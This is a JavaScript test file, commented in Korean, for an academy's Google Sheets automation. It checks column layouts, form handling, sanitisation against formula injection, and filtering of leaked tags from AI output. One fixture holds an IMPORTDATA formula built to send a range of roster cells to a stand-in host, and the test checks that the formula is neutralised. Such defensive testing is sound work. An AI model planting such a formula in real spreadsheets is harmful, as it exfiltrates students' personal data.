  assert.ok(code.includes("pf.getRange('DY1').setValue('오늘의만남')"), 'DY129 오늘의만남 보장 코드가 사라짐 — 레지스트리 갱신 필요'); // [v9.99]
  /* 🔴 진로 4열은 **번호를 박지 않는다.** 두 번 연속 틀렸다 — ①「DT128 다음이니 129」로 셌는데
   *   129·130이 주인 있는 열이었다(tests/수집.test.js 선점 검사가 잡았다 — ⚠삭제됨 08-19 e75fc7fc
   *   이므로 **지금은 그 자리를 아무도 안 잡는다**. 열 번호를 새로 박을 땐 손으로 대조한다) ②131로 옮겼더니
   *   **라이브 profiles 에 이미 「학교」·「동네」가 있었다**(타 세션 라이브 실측).
   *   세 번째를 프로즈로 막지 않는다 — 번호를 쓰는 것 자체를 금지한다. */
  assert.ok(!/CAREER_COL_\s*=\s*\d/.test(코드정제),
    '진로 블록이 고정 열 번호를 되살렸다 — 라이브에는 코드가 모르는 열이 자란다(Row ID·학교·동네)');
  assert.match(code, /profilesBlockWrite_\(dst, profilesBlockAt_\(dst, CAREER_HEADS_\)/,
    '진로 블록이 이름 해석(profilesBlockAt_)을 안 거친다');
  const nameAt = section('function profilesBlockAt_(', 'function profilesBlockWrite_(');
  assert.ok(/Row ID/.test(nameAt), '이름 해석이 Glide 「🔒 Row ID」 열을 건너뛰지 않는다 — 덮으면 행 식별이 파괴된다');
  assert.ok(/return w \+ 1/.test(nameAt), '못 찾았을 때 맨 끝에 새로 열지 않는다 — 0이나 -1이면 A열을 덮는다');
  assert.equal(code.match(/const CAREER_HEADS_ = \[([\s\S]*?)\];/)[1].split(',').filter(x => x.trim()).length, 4,
    '진로 블록 폭이 4가 아니다 — 헤더·값·문서가 갈라졌다');
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  /* ⚰ [09-04] DD1 을 이 목록에서 뺐다 — 유호 확정 09-04 「연습 노트는 걷어줘」로 그 열을 채우던
   *   기능이 없어졌고, 이름을 보장하던 마이그레이션도 함께 걷혔다.
   * 🔴 그래도 «열 자리»는 아래 레지스트리(108)에 남는다 — 라이브에서 그 열을 빼면 뒤 열이 통째로
   *   한 칸씩 밀려 위치로 읽는 다른 기능이 조용히 어긋난다(v9.138 이 그 자리다). 자리는 예약된 채로
   *   두고 값만 안 채운다 — 119(구랭킹보드_비움)가 이미 같은 꼴로 서 있다. */
  ['DB1', 'DC1'].forEach(cell => assert.ok(tb.includes("getRange('" + cell + "')"), '교재연동.js ' + cell + ' 보장 코드가 사라짐 — 레지스트리 갱신 필요'));
  assert.ok(!/getRange\('DD1'\)/.test(tb),
    'DD1 보장 코드가 되살아났다 — 연습 노트는 09-04 에 걷혔다(유호 확정). 되살리려면 이 줄부터 판정한다');
});

test('[v9.49] hw_feedback 골격 — 학생확인(Glide 전용)과 포인트지급(스크립트 전용) 열이 분리돼 있다', () => {
  const body = section('function sheetSkeleton_()', 'function bootstrapSynk()');
  /* [v9.138] 헤더가 하드코딩 2벌(시트 골격 + 배치의 ensureSheet)에서 단일 정본으로 승격됐다.
   *   그래서 검사도 문자열 대조가 아니라 **실값의 자리**를 본다 — 진짜 위험은 문구가 아니라 **중간 삽입**이다.
   *   소비처 4곳이 폭 9·10·11로 읽고 sweepFeedbackAck_는 11번째 열을 손으로 찍으므로,
   *   앞 11칸의 순서가 하나라도 밀리면 첨삭 카드 내용과 포인트 지급 표시가 통째로 어긋난다(에러 없이). */
  // [v9.241] 골격 행에 세 번째 칸(수집 표식)이 붙을 수 있다 — 지키는 사실은 「헤더 정본 상수를 쓰는가」다.
  assert.ok(/\['hw_feedback', HW_FEEDBACK_HEADERS[,\]]/.test(body), '시트 골격이 헤더 정본 상수를 쓰지 않는다(배치와 두 벌로 갈라진다)');
  const H = new Function(`${code.slice(code.indexOf('const HW_FEEDBACK_HEADERS = ['), code.indexOf('];', code.indexOf('const HW_FEEDBACK_HEADERS = [')) + 2)}
    return HW_FEEDBACK_HEADERS;`)();
  assert.deepEqual(H.slice(0, 11),
    ['id', 'student_id', '제출일', '제출문', '고친문장', '오늘의포인트', '칭찬', '다음미션', '상태', '학생확인', '포인트지급'],
    'hw_feedback 앞 11열의 자리가 바뀌었다 — 새 열은 반드시 **끝에만** 붙여야 한다(중간 삽입은 소비처 4곳을 조용히 파괴)');
  assert.equal(H[9], '학생확인', 'J열(학생확인·Glide 전용)이 제자리에 없다');
  assert.equal(H[10], '포인트지급', 'K열(포인트지급)이 제자리에 없다 — sweepFeedbackAck_가 11번째 열을 직접 찍는다');
  // [v9.138] 수집 4열 — 「2년 축적 → AI 회화 앱」의 실제 재료. 빠지면 3단 데이터·오류 집계가 성립하지 않는다
  ['숙제ID', '오류태그', '재작성원본', '다시쓰기URL'].forEach((h, i) =>
    assert.equal(H[11 + i], h, `수집 열 ${h}이(가) ${12 + i}번째 자리에 없다`));
  // 배치가 그 폭을 실제로 쓰는지 — 헤더만 늘리고 append가 11칸이면 뒤 4칸은 영원히 빈다
  const batch = section('function aiFeedbackBatch_()', 'function callClaudeFeedback_(');
  assert.ok(batch.includes('hwFeedbackEnsureCols_(fb)'), '기존 11열 시트를 15열로 증분하지 않는다 — append가 뒤 4칸을 조용히 버린다');
  assert.ok(batch.includes('hwTagsClean_(card.error_tags)'), '오류 태그가 적재되지 않는다');
  // [v9.138] 학생 입력(숙제ID·재작성원본)은 셀안전_를 거쳐야 한다 — 폼 텍스트는 남의 글이고, 같은 시트에 profiles가 있다
  assert.ok(batch.includes('셀안전_(hwId), hwTagsClean_(card.error_tags), 셀안전_(reDo), hwRedoUrlOf_('), '수집 4칸이 적재 배열 끝에 오지 않거나 수식 인젝션 방어를 거치지 않는다');
});

/* ── [v9.153] 수식 인젝션 — 로스터 채널 소독 (2026-08-04 배포 보안 검토 기왕증 수리) ──
 *   profiles A~O·Z·AY~BA·DT~DX는 상담시트 원문(이름 등 남의 글)을 writeIfChanged로 나른다.
 *   호출부마다 셀안전_를 얹는 방식은 이 계열 7곳째 재발이라, 통로(writeIfChanged) 자체가 소독한다. */

test('writeIfChanged는 문자열 셀만 셀안전_로 소독해 쓴다 — profiles 로스터 수식 인젝션 차단', () => {
  // 실제 셀안전_(상담AI.js)·실제 writeIfChanged(Code.js)를 그대로 평가 — 구현 가정을 베끼면 같이 눈이 먼다
  const 상담Src = fs.readFileSync(path.join(ROOT, '상담AI.js'), 'utf8');
  const sFrom = 상담Src.indexOf('function 셀안전_');
  assert.notEqual(sFrom, -1, '셀안전_ 정의(상담AI.js)를 찾지 못함 — writeIfChanged가 런타임에 부른다');
  // 끝 표식은 다음 함수 심볼 — '\n}' 앵커는 본문에 블록이 생기는 순간 잘린 함수를 평가한다([v9.135] groupConsts와 같은 교훈)
  const sTo = 상담Src.indexOf('function 상담_기록_(', sFrom);
  assert.notEqual(sTo, -1, '셀안전_ 추출 끝 표식(상담_기록_)을 찾지 못함');
  const 셀안전_ = new Function(상담Src.slice(sFrom, sTo) + '\nreturn 셀안전_;')();
  const wic = loadFunction('function writeIfChanged(', 'function dstr(', 'writeIfChanged', { 셀안전_ });
  const sheetOf = (cur) => { const w = []; return { writes: w, getRange: () => ({ getValues: () => cur.map(r => r.slice()), setValues: (v) => w.push(v) }) }; };
  // ① 탐지 픽스처 — 실제 유출 페이로드 표기 그대로(셀안전_ 주석의 IMPORTDATA 시나리오)
  const d = new Date(1750000000000);
  let sh = sheetOf([['기존', '', 0, '']]);
  assert.equal(wic(sh, 2, 1, [['=IMPORTDATA("http://x?d="&TEXTJOIN(",",1,B2:B60))', '안녕하세요', 3922, d]]), true);
  assert.equal(sh.writes[0][0][0], "'=IMPORTDATA(\"http://x?d=\"&TEXTJOIN(\",\",1,B2:B60))", '수식 시작 문자열이 소독 없이 통과했다');
  assert.equal(sh.writes[0][0][1], '안녕하세요', '평문까지 건드리면 안 된다');
  assert.equal(sh.writes[0][0][2], 3922, '숫자가 문자열로 강제되면 안 된다(Glide 숫자 열 파괴)');
  assert.equal(sh.writes[0][0][3], d, 'Date가 문자열로 강제되면 안 된다(created_at 등)');
  // ② [v9.25] 무변경 skip 생존 — 아포스트로피 접두는 저장 시 소비돼 재독이 원문이므로, 비교는 소독 전 원문이어야 한다.
  //    소독본 비교로 바꾸면 이 케이스가 매 실행 「다름」이 되어 로스터 블록 전체가 매일 재작성된다.
  sh = sheetOf([['=foo', '평문']]);
  assert.equal(wic(sh, 2, 1, [['=foo', '평문']]), false, '저장 후 재독(원문)과 같은데 다시 쓴다 — 원문 비교가 소독본 비교로 바뀌었다');
  assert.equal(sh.writes.length, 0, '무변경인데 setValues가 호출됐다(쿼터 낭비)');
});

test('syncProfiles의 직접 setValues(exit_log·exit_snapshot)는 소독 채널(writeIfChanged)로 쓴다', () => {
  const body = section('function syncProfiles()', 'function dailyBackup()');
  assert.ok(/writeIfChanged\(exitSh,/.test(body), 'exit_log 기록(이름·반=상담시트 원문)이 소독 채널을 우회한다');
  assert.ok(/writeIfChanged\(snapSh,/.test(body), 'exit_snapshot 기록(이름=원문 왕복값)이 소독 채널을 우회한다');
  // raw 쓰기 검출기 — 문자열 리터럴을 먼저 지운다(안 지우면 'http://x' 뒤를 주석으로 오인해 같은 줄의 진짜 쓰기를 숨긴다 — 리뷰 실측 우회 사례).
  //   리터럴 인자 setValue(상수 헤더)와 DT_HEADS 루프의 setValue(h)만 예외 — 리터럴은 남의 글일 수 없다.
  const rawWrites = (src) => {
    /* 🔑 [2026-08-13] 주석 제거를 공용 통로로 갈랐다(F401 계열). 옛 판은 문자열과 주석을 «한 정규식»
     *   으로 같이 처리했는데, 그 순서 의존이 바로 위 주석이 걱정하던 것이다(`'http://x'` 오인).
     *   이제 렉서가 그 판정을 지고(문자열 «안»은 주석이 아니다), 여기는 문자열 비우기만 남는다. */
    const stripped = 코드만(src)
      .replace(/'(?:\\.|[^'\\\n])*'|"(?:\\.|[^"\\\n])*"|`(?:\\[\s\S]|[^`\\])*`/g, "''");
    return (stripped.match(/\.(?:setValues?|appendRow|setFormulas?)\([^)\n]*/g) || [])
      .filter((c) => c !== ".setValue(''" && c !== '.setValue(h');
  };
  // 탐지 능력 픽스처 — 리뷰에서 옛 가드를 실제로 통과했던 우회 3종이 전부 걸리는지 먼저 못박는다
  assert.equal(rawWrites('dst.getRange(2, 200).setValue(row[0]);').length, 1, '단건 setValue 우회를 못 잡는다');
  assert.equal(rawWrites('exitSh.appendRow([userId, row[0]]);').length, 1, 'appendRow 우회를 못 잡는다');
  assert.equal(rawWrites("Logger.log('https://x'); d.getRange(9,9,1,1).setValues([[row[0]]]);").length, 1,
    '문자열 안 //를 주석으로 오인해 같은 줄의 setValues를 놓친다');
  assert.deepEqual(rawWrites(body), [],
    'syncProfiles에 소독 채널(writeIfChanged) 밖의 시트 쓰기가 생겼다 — 남의 글이 raw로 실리는 새 경로(리터럴 setValue만 예외)');
});

test('[v9.49] 첨삭 확인 정산은 지급(appendPoints) 성공 뒤에만 지급완료로 표시한다', () => {
  const body = section('function sweepFeedbackAck_(', 'function aiFeedbackBatch_()');
  assertOrder(body, [
    'const doneToday = new Set()',            // point_logs 재조회(크래시 재시도 중복 방지)
    "appendPoints(ss, [[sid, AI_FEEDBACK_ACK_POINTS, '첨삭확인', '시스템']])", // 행 단위 지급 먼저(리뷰 M2)
    "fb.getRange(i + 2, 11).setValue('지급완료')" // 마킹은 그 뒤
  ]);
  assert.ok(body.includes('!노출카드_(r[8])')); // 검수 게이트: 노출 상태만 지급 ([v9.210] 판정 정본)
});

test('[v9.49] AI 첨삭 배치는 API 키가 없으면 전체 스킵하고, 성공분 즉시 포인터를 전진한다(하드킬 중복 차단)', () => {
  const body = section('function aiFeedbackBatch_()', 'function callClaudeFeedback_(');
  assertOrder(body, [
    "props.getProperty('CLAUDE_API_KEY')",
    'if (!apiKey) return',
    'AI_FEEDBACK_MAX_PER_RUN || Date.now() - t0 > AI_BUDGET_MS', // 상한+자체 2분 예산(리뷰 H1)
    '성공분 즉시 포인터 전진',                                      // 하드킬(throw 없는 강제종료)에도 중복 생성 0
    '포이즌 필 차단',                                              // 영구 오류 행은 기록 후 건너뜀(리뷰 M1)
    'break; // 실패 행부터 포인터 유지'                              // 일시 오류만 중단→재시도
  ]);
  assert.ok(body.includes("props.setProperty('숙제폼_포인터', String(it.ptr))"), '포인터 전진이 대기줄 항목의 값이 아니다');
  // [v9.198] 입력이 2원(숙제폼 + 강의 한줄요약)이 된 뒤의 급소 — 강의요약(ptr=0)이 포인터를 밀면
  //   그 사이 도착한 숙제 제출이 통째로 건너뛰어진다(조용한 유실). 전진은 숙제폼에서 온 줄에만 걸린다.
  assert.ok(/const 전진_ = function \(it\) \{ if \(it\.ptr\)/.test(body),
    '전진_ 가 ptr 유무를 안 본다 — 강의요약이 숙제폼 포인터를 밀 수 있다');
  assert.equal((body.match(/props\.setProperty\('숙제폼_포인터'/g) || []).length, 2,
    '포인터를 쓰는 곳은 전진_ 와 클램프 둘뿐이어야 한다 — 세 번째가 생기면 소스 판정을 우회한다');
  // 오류 분류기: 영구(재시도 무의미) 플래그가 없으면 불량 행 하나가 큐 전체를 영구 차단한다
  const api = section('function callClaudeFeedback_(', 'function parentSweep()');
  assert.ok(api.includes('e.permanent = (rc === 400'));
  assert.ok(api.includes('permErr'));
});

test('[v9.49] 폼 출석 method는 출석 판정 키워드를 포함하고 당일 중복은 스킵한다', () => {
  const body = section('function sweepAttendanceForm_(', 'function sweepFeedbackAck_(');
  assert.ok(body.includes("'출석(폼)'")); // todayBoard·raid의 indexOf('출석') 판정 호환
  assert.ok(body.includes('seen[key]'));  // 같은 날 중복 제출·앱/일괄 병행 스킵
  assert.ok(body.includes("props.setProperty('출석폼_포인터', String(last))"));
});

test('[v9.49] 신규 사유 첨삭확인이 일일한도·미인식 스캐너에 등록돼 있고 숙제 키워드를 오염시키지 않는다', () => {
  assert.ok(code.includes("'첨삭확인': 1"), 'DAILY_LIMIT에 첨삭확인 누락');
  const scan = section('function unknownReasonScan_(', 'function checkUnknownReasonsNightly_');
  assert.ok(scan.includes("'첨삭'"), 'KNOWN_RS에 첨삭 누락 — 매일 밤 미인식 경보가 뜬다');
  // 사유에 '숙제'가 들어가면 숙제왕 카운트(indexOf 숙제)가 첨삭 확인으로 부풀려진다
  assert.equal(코드정제.includes("'숙제첨삭확인'"), false);
});

test('[v9.49] 스위프·야간 배치에 폼출석·첨삭정산·첨삭생성이 편입돼 있다', () => {
  const sweep = section('function parentSweep()', 'function translateTopics_');
  assertOrder(sweep, [
    "safeRun('sweepAttendanceForm'",  // 등원알림·보드·미등원판정 앞
    "safeRun('expandAttendanceBatch'",
    "safeRun('sweepFeedbackAck'"
  ]);
  const night = section('function nightJobs()', 'function dailyBackupJob()');
  assert.ok(night.includes("safeRun('aiFeedbackBatch', aiFeedbackBatch_)"));
});

test('[v9.47] 경영 보고는 단일화 — monthlyReport는 위임 shim이고 월보는 병합 로그를 읽는다', () => {
  const mr = section('function monthlyReport()', 'function archiveMonthly');
  assert.ok(mr.includes('buildExecReport_()'));
  assert.ok(mr.length < 900, '구 monthlyReport 본문이 남아 있으면 월간 메일이 2통으로 돌아간다');
  const exec = section('function buildExecReport_()', 'function setAppState_');
  assert.ok(exec.includes('readPointLogs_(ss, 7)'));
  assert.ok(exec.includes("setAppState_(ss, '경영리포트HTML', html)")); // 콕핏 키 이름 불변(가이드 §9-1 정합)
});

// ───────────────────────── v9.54 최종 점검 팩 회귀 장치 ─────────────────────────

test('[v9.54] setupStore는 전체 열 보존 경로(replaceContentType)로만 contents를 만진다', () => {
  const body = section('function setupStore()', 'function healthCheck()');
  assert.ok(body.includes("replaceContentType(ss, 'store'"), 'setupStore는 replaceContentType에 위임해야 한다');
  // 구 6열 clear/압축 패턴이 되살아나면 몽골어(G)·영어(H)·Glide Row ID가 생존 행에서 오정렬된다
  assert.equal(/clearContent\(\)/.test(코드만(body)), false, 'setupStore 안에 직접 clearContent가 있으면 안 된다');
  assert.equal(코드만(body).includes('getRange(2, 1, last - 1, 6)'), false, '6열 고정 접근 금지');
});

test('[v9.54] 학부모 하이라이트는 쿼터 소진 시 월 마커를 미루고 보류 명단으로 이어 보낸다', () => {
  const body = section('function parentHighlightsMail_()', 'function snsDrafts_()');
  assert.ok(body.includes('doneSids.has(s.id)'), '보류 명단(이미 발송) 학생은 재발송에서 제외돼야 한다');
  assertOrder(body, [
    'quotaShort = true',
    "props.setProperty('하이라이트보류'",
    "props.setProperty('하이라이트발송월', ym)"
  ]);
  // 마커 무조건 세팅(구 결함)이 되살아나면: 쿼터로 스킵된 학생들이 그 달 하이라이트를 영영 못 받는다
  assert.ok(body.includes('if (quotaShort)'), '마커는 전원 처리 완료(quotaShort=false)일 때만 세팅');
  const morning = section('function morningJobs()', 'function nightJobs()');
  assert.ok(morning.includes("safeRun('parentHighlightsRetry', parentHighlightsMail_)"), '아침 배치 재시도 편입 누락');
});

test('[함께한날 막4] 장면 내레이터(구 진화 배너)는 실데이터를 쓴다 — 범위 밖 r[18] 금지', () => {
  const idx = code.indexOf('NARRATE_SCENE, id + todayYmd0');
  assert.notEqual(idx, -1, '장면 내레이터 호출부를 찾지 못함');
  const seg = code.slice(idx, idx + 400);
  assert.ok(seg.includes('daysNow'), '{d} 슬롯은 함께한 날 실값(daysNow)이어야 한다');
  // pfData는 15열(인덱스 0~14)만 읽는다 — r[18]은 상시 undefined라 항상 폴백이 나오던 v9.50·B1 결함
  assert.equal(코드만(seg).includes('r[18]'), false);
});

test('[v9.54] aiText_는 사고 OFF로 짧은 예산 전액을 본문에 쓴다(폴백률 급증 방지)', () => {
  const body = section('function aiText_(', 'function aiStudents_(');
  assert.ok(body.includes("thinking: { type: 'disabled' }"),
    '이 모델군은 thinking 생략 시 적응형 사고가 기본 ON — 사고 토큰이 900~1536 예산을 잠식한다');
});

/* [v9.204] 사고를 끈 대가를 같은 자리에서 막는다.
 * Opus 5는 thinking 비활성 상태에서 내부 XML 태그를 본문에 흘릴 수 있다(벤더 정본 실측 조항).
 * aiText_ 의 반환값은 정제 없이 학생 스토리·「미래의 나」 편지·몽골어 진단 리포트·주간 운영
 * 리포트로 그대로 나가므로, 누출은 학부모 접점에서 처음 보인다 — 코드 어디도 안 빨갛다.
 * ⚠ 이 회귀는 「버그가 아직 있을 것」을 요구하지 않는다 — 가드 문구의 실존만 본다. */
test('[v9.204] aiText_는 사고를 끈 대가(내부 태그 누출)를 가드 문구로 막는다', () => {
  const body = section('function aiText_(', 'function aiStudents_(');
  const m = body.match(/system:\s*'([^']*)'/);
  assert.ok(m && m[1].includes('태그'),
    '사고 OFF + Opus 5 = 내부 태그가 본문에 샌다. 반환값은 학부모·학생에게 그대로 나간다');
  // 정본이 못박은 두 반례. ⚠ 주석이 아니라 **가드 문구 자체만** 잰다 —
  //   본문 전체로 넓히면 이 반례를 설명하는 주석이 자기 가드를 빨갛게 만든다(자기 처방 차단).
  assert.equal(/thinking|<[a-z_]+>/i.test(m[1]), false,
    '가드에 태그 이름을 적지 않는다(일반형이 더 잘 듣는다)');
  assert.equal(/생각하지\s*마|사고하지\s*마|추론하지\s*마/.test(m[1]), false,
    '「생각하지 마라」류는 태그 누출을 되레 늘린다');
});

/* [v9.205] v9.204 는 «문구»만 넣었다 — 그건 또 하나의 모델 지시이지 경계가 아니다(①배포 검수 P1).
 * 이 회귀는 앞의 것과 재는 층이 다르다: 위는 문구의 실존을, 여기는 **실제 동작**을 잰다.
 * 탐지력은 픽스처가 진다(실저장소가 아니라) — 「버그가 아직 있을 것」을 요구하지 않는다. */
test('[v9.205] aiText_는 태그가 보이면 응답을 버린다 — 결정적 경계(문구는 확률적이다)', () => {
  const 누출 = loadFunction('function 태그누출_(', 'function aiText_(', '태그누출_', {});

  // 탐지력 — 이 넷이 실제 누출의 모양이다
  assert.equal(누출('<' + 'reasoning>내부 사고<' + '/reasoning>본문입니다'), true, '감싼 블록');
  assert.equal(누출('본문입니다 <' + 'tool_use name="x">'), true, '속성 달린 여는 태그');
  assert.equal(누출('본문 도중 예산이 끊겨 <' + 'reason'), true, '«>» 없이 잘린 꼬리도 누출이다');
  assert.equal(누출('<' + '/output>'), true, '닫는 태그 홀로');

  // 거짓양성 — 실제 산출물의 모양(웰컴 스토리·몽골어 진단 리포트·주간 해설)
  assert.equal(누출('민수 크루의 여정이 시작됩니다. 매일의 기록이 이야기가 됩니다.'), false);
  assert.equal(누출('Таны оноо: 12/15\nТүвшин: 초급 2 анги.'), false);
  assert.equal(누출('출석률이 지난주 5 < 10 에서 올랐습니다.'), false, '비교 기호는 태그가 아니다');
  assert.equal(누출(null), false);
  assert.equal(누출(''), false);

  // 라우팅 — 헬퍼가 있어도 aiText_ 가 안 부르면 경계가 아니다(가드는 로직보다 등록층에서 샌다)
  const body = section('function aiText_(', 'function aiStudents_(');
  assert.ok(/태그누출_\(/.test(body), 'aiText_ 가 반환 전에 태그누출_ 을 지나야 한다');
  assert.ok(body.indexOf('태그누출_(') < body.lastIndexOf('return out;'),
    '검사는 반환 «전»에 있어야 한다');
});

test('[v9.54] 상담 임포트·정리의 600행 창은 시트 물리 행수로 클램프된다', () => {
  const imp = section('function importFormResponses()', 'function setupStore()');
  assert.ok(imp.includes('consult.getMaxRows()'), '고정 600행 읽기는 행<602 시트에서 10분마다 크래시');
  const cln = section('function cleanupFormTest()', 'function setupTables()');
  assert.ok(cln.includes('consult.getMaxRows()'));
});

test('[v9.54] AI 스튜디오는 학생·약점 로더를 1회만 read한다(①·③ 중복 제거)', () => {
  const body = section('function aiStudioBatch_()', 'function welcomeStoryBatch_(');
  assert.equal((body.match(/aiStudents_\(ss\)/g) || []).length, 1, 'aiStudents_ 전량 read는 메모이즈 안에서 1회만');
  /* [v9.250] 인자가 붙어도 잡는다 — `aiWeakMap_(ss, 복귀)` 로 넓힌 뒤 이 검사가 **0건을 세어 초록**이
   *   될 뻔했다(찾는 모양이 낡으면 「1회만」이 「한 번도 안 함」과 구분이 안 된다). */
  assert.equal((body.match(/aiWeakMap_\(ss[,)]/g) || []).length, 1, 'aiWeakMap_ 전량 read는 메모이즈 안에서 1회만');
  /* [v9.250 · #Q99 5/5] 셋째 로더 — `exit_log` 전량 read 도 같은 규율을 진다. 창을 ①·③ 중 한쪽에만
   *   넓히면 **같은 학생이 두 산출에서 다른 사람이 된다** — 그래서 «중복 제거»와 «정합»이 한 검사다. */
  assert.equal((body.match(/복귀창_\(ss\)/g) || []).length, 1, '복귀창_ 전량 read는 메모이즈 안에서 1회만');
});

test('[v9.54] 미등원 판정은 attendance 부재 시 열리지 않는다(전원 미등원 오경보 방지)', () => {
  const body = section('function checkNoShow()', 'function checkScene');
  assertOrder(body, ["ss.getSheetByName('attendance')", 'if (!at) return;', 'at.getLastRow()']);
});

test('[v9.60] 레벨테스트 폼 생성은 재실행 안전 — 이미 있으면 새 폼을 만들지 않는다', () => {
  const body = section('function createLevelTestForm()', 'function cleanupOrphanFormSheets()');
  // 2026-07-24 실사고: 두 번째 실행이 시트 이름 충돌로 죽으면서 중복 폼 + 잔재 응답 시트를 남겼다.
  // 조기 반환(있으면 만들지 않음)이 FormApp.create보다 반드시 앞에 와야 한다.
  assertOrder(body, ["ss.getSheetByName('레벨테스트_응답')", 'return msgX;', 'FormApp.create(']);
  assert.ok(body.includes('shX.getFormUrl()'), 'URL 기록이 없을 때 시트에 연결된 폼에서 회수해야 재생성을 피한다');
});

test('[v9.62] 출석·숙제 폼 생성도 재실행 안전 — 가드가 FormApp.create보다 앞에 있다', () => {
  // 2026-07-24: 레벨테스트 폼(v9.60)과 같은 계급. linkFormTab_이 이름 충돌은 피해주지만,
  // 재실행마다 중복 폼 + 유령 응답 시트가 쌓이고 URL 틀이 새 폼으로 갈아끼워져 배포된 링크가 죽는다.
  const att = section('function createAttendanceForm()', 'function createHwForm()');
  assertOrder(att, ['formAlreadyMade_(ss,', 'if (doneA) return doneA;', 'FormApp.create(']);
  const hw = section('function createHwForm()', 'function importFormResponses()');
  assertOrder(hw, ['formAlreadyMade_(ss,', 'if (doneH) return doneH;', 'FormApp.create(']);
  const guard = section('function formAlreadyMade_(', 'function createAttendanceForm()');
  assert.ok(guard.includes('sh.getFormUrl()'), '응답 시트만 남은 경우 연결 폼에서 URL 틀을 복구해야 한다');
  assert.ok(guard.includes("if (!tpl) return '';"), '복구 실패 시에는 정상 생성 경로로 빠져야 한다');
});

test('[v9.66] 상담폼 생성도 재실행 안전 — 살아있는 폼이 있으면 재생성하지 않는다', () => {
  // 상담폼은 응답 시트가 없어(setDestination 미사용) formAlreadyMade_를 못 쓴다 — app_state 상담폼ID 생존 확인이 가드.
  // 가드(조기 return)가 FormApp.create보다 반드시 앞: 재생성되면 상담폼ID가 갈아끼워져 배포된 링크 응답이 미아가 된다.
  const body = section('function createConsultForm()', 'function migrateConsultV184()');
  assertOrder(body, ["getState(st, '상담폼ID')", 'return msg0;', 'FormApp.create(']);
});

test('[v9.66] v18.4 증분 기입은 보호 구간(60~62열)을 건너뛰고 이름 매칭으로만 간다', () => {
  const imp = section('function importFormResponses()', 'function setupStore()');
  // 규칙 순서: 1~59열 → 증분(63열~) → 노션이관. 60~62열(학생ID·자동열)에 폼 답이 기입되는 경로가 생기면 안 된다.
  assertOrder(imp, ['c <= 59', 'c >= 63', 'narrative.push']);
  assert.ok(imp.includes('consult.getLastColumn()'), '헤더 폭이 62 고정이면 증분 열이 노션이관으로 새어 나간다');
  assert.ok(imp.includes('getRange(newRow, 63, 1,'), '증분 구간은 조밀 배치 쓰기(리뷰 H1) — 개별 setValue는 재사용 행에 이전 학생 민감정보를 남긴다');
  const chk = section('function checkFormMapping(', "/* ===================== [v5.4] 원장 브리핑");
  assert.ok(chk.includes('c >= 63'), 'checkFormMapping이 importFormResponses와 같은 규칙이어야 진단을 믿을 수 있다');
  // 증분 헤더 정본 동결 — 이름이 바뀌면 시트·폼·Crew Dossier 3자 정합이 조용히 깨진다
  assert.ok(code.includes("['학교명/전공', '방문상세', '거절정황', '선호그룹', '인생드라마', '취미관심사']"),
    'CONSULT_EXT_HEADERS 정본 배열이 변형됨 — 시트 헤더·폼 문항 제목과 함께 바꿔야 한다');
});

test('[v9.157] 폼 응답의 시트 직기입은 행소독_ 통로를 지난다 — 수식 인젝션 차단(문자열만·타입 보존)', () => {
  // ── 통로 자체 ──
  const gate = section('function 행소독_(rows)', 'function dstr(');
  assert.ok(/typeof v === 'string'\s*\?\s*셀안전_\(v\)\s*:\s*v/.test(gate),
    '행소독_이 문자열만 소독하지 않는다 — typeof 가드가 빠지면 생년월일 Date·포인트 숫자가 문자열화된다');
  assert.ok(gate.includes('Array.isArray(r)'), '행소독_이 1차원(한 행) 입력을 처리하지 않는다');

  // ── 적용된 결과 검사(guard-must-check-result): 폼 유래 직기입 4곳이 전부 통로를 지나야 한다 ──
  const imp = section('function importFormResponses()', 'function setupStore()');
  assert.ok(imp.includes('setValues(행소독_([rowArr]))'), '상담시트 1~59열 기입이 소독 통로를 지나지 않는다');
  assert.ok(imp.includes('setValues(행소독_([extArr]))'), '상담시트 증분(63~) 기입이 소독 통로를 지나지 않는다');
  assert.ok(/fr\.getRange\([\s\S]{0,60}setValues\(행소독_\(/.test(imp), 'form_responses 기입(이름=폼 유래)이 소독 통로를 지나지 않는다');
  assert.equal(/setValues\(\[rowArr\]\)|setValues\(\[extArr\]\)|setValues\(\[\[\s*'R'/.test(코드만(imp)), false,
    '소독 없는 직기입 경로가 되살아났다');
  // 스위프 3종 — 리드폼(공개 광고 CTA)·강의폼(학생 배포)·마감폼(강사). 전부 같은 스프레드시트에 profiles가 산다
  //   구간은 함수 경계로 자른다 — 「포인터 저장」 같은 문구 표식은 클램프용으로 함수 앞부분에도 나와서
  //   적재 코드 앞에서 잘리고, 그러면 가드가 통과해도 아무것도 검사하지 않은 셈이 된다(실제로 그렇게 잘렸다).
  const fnOf = (name) => {
    const s = code.indexOf('function ' + name + '(');
    assert.notEqual(s, -1, name + ' 정의를 찾지 못함');
    const e = code.indexOf('\nfunction ', s + 10);
    return code.slice(s, e === -1 ? code.length : e);
  };
  //   폼 스위프 전수 — 공개 폼(리드·레벨테스트)·학생 배포 폼(강의)·강사 폼(마감·약점·학업·결석).
  //   목적지가 전부 profiles·leads와 같은 스프레드시트다. 하나라도 빠지면 그 입구로 같은 공격이 그대로 들어온다.
  const sweeps = [
    ['sweepLeadForm_', 'leads(광고 리드폼)'],
    ['sweepLevelTest_', 'leads(레벨테스트 — 공개 마케팅 폼)'],
    ['sweepLectureForm_', 'lecture_views(강의폼)'],
    ['sweepLessonCloseForm_', 'lesson_close(차시 마감폼)'],
    ['sweepTeacherMemoForm_', 'student_errors(약점 메모폼)'],
    ['sweepAcademicForm_', 'academic_log(학업폼)'],
    ['sweepAbsenceForm_', 'absence_followup(결석 연락폼)'],
    ['sweepClassAttendanceForm_', 'attendance_batch(반 출석 폼 · 09-02 폼 넷)'],
    ['sweepTeacherCheckinForm_', 'teacher_checkins(출퇴근 폼 · 09-02 폼 넷)'],
  ];
  sweeps.forEach(([name, label]) => {
    const body = fnOf(name);
    assert.ok(/\.(?:setValues|appendRow)\(행소독_\(/.test(body), label + ' 적재가 소독 통로를 지나지 않는다 — 폼 응답이 raw로 실린다');
    assert.equal(/\.setValues\((?:out|add)\)|\.appendRow\(\[/.test(코드만(body)), false, label + '에 소독 없는 적재가 남아 있다');
  });

  /* [v9.159] voiceSweep_ — 8번째 스위프. **위 배열에 넣을 수 없다**: 교재연동.js는 `ENGINE_FILES` 밖이라
   *   fnOf(엔진 합본)가 못 찾고, 못 찾으면 그 자리는 「검사했는데 아무것도 안 본」 상태가 된다.
   *   그래서 상담AI.js를 다루는 방식대로 파일을 직접 읽는다(_engine-source를 건드리지 않는다).
